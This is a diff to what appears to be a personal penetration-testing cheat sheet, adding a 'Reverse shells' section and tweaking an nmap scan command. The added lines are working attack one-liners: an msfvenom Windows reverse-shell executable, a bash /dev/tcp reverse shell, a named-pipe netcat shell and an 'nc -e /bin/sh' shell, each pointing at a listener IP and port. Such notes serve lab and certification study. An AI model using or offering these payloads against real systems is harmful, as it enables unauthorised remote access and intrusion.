@@ -14,6 +14,8 @@ xclip -sel c < input_file
 ##### Ensure bash one-liner runs in bash (rather in sh shell)
 ```bash
 bash -c "bash <oneliner>"
+
+# example bash reverse shell
 ```
 
 ##### Use PowerShell (pwsh on Kali) to base64 encode powercat download & reverse shell
@@ -50,6 +52,31 @@ touch /home/kali/webdav/test.txt
 # Set root of directory to the /home/kali/webdav/ folder
 /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 ```
+
+### Reverse shells
+##### Simple reverse shell .exe for Windows
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o /tmp/<evil.exe>
+```
+
+##### Bash
+```bash
+/bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+```
+
+
+##### Using named pipes
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.214 4444 >/tmp/f
+```
+
+##### NC
+```bash
+nc -e /bin/sh 10.0.0.1 1234
+```
+
+
+
 
 
 # OSINT
@@ -410,7 +437,7 @@ sudo nmap -A -sV -sC -sU 192.168.50.14 --script=*enum -vv
 
 ##### Scan all ports, skip host discovery - Removed
 ```bash
-nmap 192.168.50.14 -vv -n -Pn -p-
+sudo nmap -n -Pn -p- -vv 192.168.195.11
 	(may need to add --max-scan-delay=0)
 ```
 
